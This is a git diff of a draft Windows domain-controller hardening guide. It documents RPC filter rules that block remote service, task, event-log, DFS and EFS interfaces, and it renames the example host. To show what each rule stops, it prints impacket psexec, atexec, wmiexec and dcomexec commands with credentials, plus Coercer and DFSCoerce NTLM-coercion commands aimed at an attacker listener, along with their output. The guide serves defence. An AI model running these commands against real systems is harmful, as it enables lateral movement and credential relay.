@@ -22,11 +22,10 @@ footer-right: "\\hspace{1cm}"
 
 ## Change History {.unnumbered}
 
-| Date       | Version | Author        | Description     |
-|------------|--------:|---------------|-----------------|
-| 2024-03-15 | 0.1     | P. Formanek   | Initial version |
-| 2024-03-22 | 0.2     | M. Grafnetter | Firewall rules  |
-|            |         |               |                 |
+| Date       | Version | Author                     | Description     |
+|------------|--------:|----------------------------|-----------------|
+| 2024-05-23 | 1.0     | P. Formanek, M. Grafnetter | Initial version |
+|            |         |                            |                 |
 
 ## Glossary {.unnumbered}
 
@@ -370,7 +369,7 @@ Fortunately, it is possible to use the RPC Filters, a lesser known feature of th
 The [\[MS-SCMR\]: Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f) with UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) is used by the built-in `services.msc` console and the `sc.exe` utility to remotely manage Windows services:
 
 ```shell
-sc.exe \\contoso-dc query wuauserv
+sc.exe \\dc01 query wuauserv
 ```
 
 ```txt
@@ -386,17 +385,17 @@ SERVICE_NAME: wuauserv
 While the built-in Windows tools use the TCP/IP transport, hacktools commonly utilize the [\\PIPE\\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) SMB named pipe to execute code on remote systems:
 
 ```shell
-impacket-psexec 'contoso/Admin:Pa$$w0rd@contoso-dc'
+impacket-psexec 'contoso/Admin:Pa$$w0rd@dc01'
 ```
 
 ```txt
 Impacket v0.11.0 - Copyright 2023 Fortra
 
-[*] Requesting shares on contoso-dc.....
+[*] Requesting shares on dc01.....
 [*] Found writable share ADMIN$
 [*] Uploading file vQfMdUbQ.exe
-[*] Opening SVCManager on contoso-dc.....
-[*] Creating service hOdT on contoso-dc.....
+[*] Opening SVCManager on dc01.....
+[*] Creating service hOdT on dc01.....
 [*] Starting service hOdT.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.20348.2340]
@@ -406,7 +405,7 @@ C:\Windows\system32>
 ```
 
 ```shell
-impacket-smbexec 'contoso/Admin:Pa$$w0rd@contoso-dc'
+impacket-smbexec 'contoso/Admin:Pa$$w0rd@dc01'
 ```
 
 ```txt
@@ -431,7 +430,7 @@ add filter
 The [\[MS-TSCH\]: Task Scheduler Service Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931) with UUID [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) is used by the built-in `taskschd.msc` console and the `schtasks.exe` utility to remotely manage scheduled tasks:
 
 ```shell
-schtasks.exe /query /s contoso-dc /tn "\Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives"
+schtasks.exe /query /s dc01 /tn "\Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives"
 ```
 
 ```txt
@@ -444,7 +443,7 @@ BitLocker Encrypt All Drives             N/A                    Ready
 While the built-in Windows tools use the TCP/IP transport, hacktools commonly utilize the [\\PIPE\\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) SMB named pipe to execute code on remote systems:
 
 ```shell
-impacket-atexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+impacket-atexec 'contoso/Admin:Pa$$w0rd@dc01' hostname
 ```
 
 ```txt
@@ -455,7 +454,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Running task \ZNSsJjLS
 [*] Deleting task \ZNSsJjLS
 [*] Attempting to read ADMIN$\Temp\ZNSsJjLS.tmp
-CONTOSO-DC
+DC01
 ```
 
 Two additional interfaces with UUIDs [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) and [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) are exposed through the `\PIPE\atsvc` pipe and are only used by the legacy `at.exe` command line tool.
@@ -484,17 +483,13 @@ add filter
 The [\[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even6/18000371-ae6d-45f7-95f3-249cbe2be39b) with UUID [F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even6/3479d837-b759-4b13-9d5e-4c93eede7cb6) is used by the built-in `eventvwr.msc` console and the `wevtutil.exe` command line tool to remotely query and manage Windows event logs:
 
 ```shell
-wevtutil.exe /r:contoso-dc qe Security /c:1 /f:text
+wevtutil.exe /r:dc01 qe Security /c:1 /f:text
 ```
 
-An older version of the protocol with UUID called [\[MS-EVEN\]: EventLog Remoting Protocol]()
-
-Ability to clear security event logs remotely.
+Malicious actors might use this protocol to clear security event logs remotely and thus cover their tracks. The following sequence of `netsh.exe` commands will block MS-EVEN6 connections over named pipes, while still allowing the TCP/IP traffic used by legitimate tools:
 
 ```txt
-# Block [MS-EVEN6]: EventLog Remoting Protocol Version 6.0
-# Named pipe: \PIPE\eventlog
-# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+rpc filter
 add rule layer=um actiontype=block filterkey=dedffabf-db89-4177-be77-1954aa2c0b95
 add condition field=protocol matchtype=equal data=ncacn_np
 add condition field=if_uuid matchtype=equal data=f6beaff7-1e19-4fbb-9f8f-b89e2018337c
@@ -503,13 +498,33 @@ add filter
 
 #### \[MS-EVEN\]: EventLog Remoting Protocol
 
-TODO
+The [\[MS-EVEN\]: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) with UUID [82273FDC-E32A-18C3-3F78-827929DC23EA](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/648145da-250e-4c1f-b8e4-8044c1bd4a20) is an older version of the [MS-EVEN6](#ms-even6-eventlog-remoting-protocol-version-60) protocol described above.
 
-Legacy proto, Uses only named pipes
+The protocol is only exposed over the [\\PIPE\\eventlog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/648145da-250e-4c1f-b8e4-8044c1bd4a20) named pipe on older operating systems and might be abused by malicious actors to initiate the NTLM relay attack:
+
+```shell
+coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip 'dc01.contoso.com' --listener-ip hacker-pc --always-continue --filter-protocol-name MS-EVEN --filter-transport msrpc
+```
 
 ```txt
-# Block [MS-EVEN]: EventLog Remoting Protocol
-# Named pipe: \PIPE\eventlog
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+
+[info] Starting coerce mode
+[info] Scanning target dc01.contoso.com
+[+] SMB named pipe '\PIPE\eventlog' is accessible!
+   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
+      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.213.0.100\BvcavuA5\aa')
+[+] All done! Bye Bye!
+```
+
+The following sequence of `netsh.exe` commands will block the legacy MS-EVEN protocol traffic entirely:
+
+```txt
+rpc filter
 add rule layer=um actiontype=block filterkey=f7f68868-5f50-4cda-a18c-6a7a549652e7
 add condition field=if_uuid matchtype=equal data=82273FDC-E32A-18C3-3F78-827929DC23EA
 add filter
@@ -519,20 +534,22 @@ add filter
 
 Restrict to Domain Admins
 
+Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol
+Named pipe: \PIPE\netdfs
+Limit access to Domain Admins only.
+
 ```shell
-python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc contoso-dc
+python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc dc01
 ```
 
 ```txt
-# Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol
-# Named pipe: \PIPE\netdfs
-# Limit access to Domain Admins only.
+rpc filter
+
 add rule layer=um actiontype=permit filterkey=43873c58-e130-4ffb-8858-d259a673a917
 add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
 add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
 add filter
 
-# Block MS-DFSNM by default
 add rule layer=um actiontype=block filterkey=0a239867-73db-45e6-b287-d006fe3c8b18
 add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
 add filter
@@ -559,7 +576,7 @@ add filter
 #### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
 
 ```shell
-coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
+coercer coerce --target-ip dc01 --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
 ```
 
 ```txt
@@ -610,11 +627,11 @@ add filter
 #### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol
 
 ```powershell
-Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
+Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName dc01
 ```
 
 ```shell
-impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+impacket-wmiexec 'contoso/Admin:Pa$$w0rd@dc01' hostname
 ```
 
 Solved using Defender ASR rules.
@@ -626,7 +643,7 @@ TODO: Test service creation using WMI
 TODO: Block command execution over DCOM over named pipes (ShellWindows, ShellBrowserWindow, and MMC20 objects)
 
 ```shell
-impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+impacket-dcomexec 'contoso/Admin:Pa$$w0rd@dc01' hostname
 ```
 
 TODO: Does it event work?
